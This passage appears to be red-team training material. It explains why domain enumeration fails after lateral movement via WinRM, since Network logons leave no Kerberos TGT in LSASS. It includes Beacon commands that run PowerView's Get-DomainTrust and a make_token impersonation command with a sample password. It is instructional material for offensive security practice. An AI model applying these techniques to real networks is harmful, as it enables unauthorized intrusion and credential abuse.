
After moving laterally to a new computer, you may fall into the trap of attempting to move laterally again immediately or running a domain enumeration tool, and be left wondering why it doesn't work.  In the example below, I have moved laterally to _lon-ws-1_ using the WinRM technique, and found that the `Get-DomainTrust` cmdlet from PowerView throws an exception.

```powershell
[+] established link to parent beacon: 10.10.120.101
 
beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
beacon> powerpick Get-DomainTrust

ERROR: Exception calling "FindOne" with "0" argument(s): "An operations error occurred.
ERROR: "
ERROR: At line:6330 char:50
ERROR: + ... $PSBoundParameters['FindOne']) { $Results = $CompSearcher.FindOne() }
ERROR: +                                      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ERROR:     + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
ERROR:     + FullyQualifiedErrorId : DirectoryServicesCOMException
ERROR:  
ERROR: Exception calling "FindAll" with "0" argument(s): "An operations error occurred.
ERROR: "
ERROR: At line:19691 char:24
ERROR: +                 else { $Results = $TrustSearcher.FindAll() }
ERROR: +                        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ERROR:     + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
ERROR:     + FullyQualifiedErrorId : DirectoryServicesCOMException
ERROR:
```

So why does this happen, is it a bug?  No. This is just a consequence of how different logon types work in Windows.  The common types are:

- #### Interactive
    The user is logging on interactively.
    
- #### Network
    The user is logging on over the network.
    
- #### Batch
    The logon is for a batch process (i.e. scheduled task).
    
- #### Service
    The logon is for a service account.
    
- #### NetworkCleartext
    The logon is a network logon with plaintext credentials.
    
- #### NewCredentials
    Allows the caller to clone its current token and specify new credentials for outbound connections (i.e. runas /netonly).
    
- #### RemoteInteractive
    The logon is via a Remote Desktop session that is both remote and interactive.

For the purposes of our discussion here, the most important difference between these logon types is whether or not the credentials of the authenticating user are stored in LSASS on the **remote** target, whether that be an NTLM hash, Kerberos TGT, or a plaintext password.  The only logon type that does not leave credentials in LSASS is Network.  It also just so happens that both WinRM and PsExec use the Network type.

If we take note of the tickets in this new session on _lon-ws-1_, we only have the HTTP service ticket that allowed us to use the WinRM service.

```powershell
Cached Tickets: (1)

#0>	Client: rsteel @ CONTOSO.COM
	Server: HTTP/lon-ws-1 @ CONTOSO.COM
	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
	Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize 
	Start Time: 2/18/2025 10:43:31 (local)
	End Time:   2/18/2025 20:43:31 (local)
	Renew Time: 0
	Session Key Type: AES-256-CTS-HMAC-SHA1-96
	Cache Flags: 0x8 -> ASC 
	Kdc Called:
```

And of course, without the TGT of the user, any attempts to authenticate to other resources will fail (e.g. we cannot obtain a service ticket for LDAP to perform domain enumeration).  The solution is to leverage a user impersonation technique, such as make_token or ptt, to populate the Beacon session with some credentials.  Only then will the session be able to authenticate to domain resources.

```powershell
make_token CONTOSO\rsteel Passw0rd!
```

However, you must also ask yourself if that is even necessary.  For instance, must that domain enumeration be done from this session, or could it be done from another session that you know already has credential material (e.g. the session we jumped from in the first place).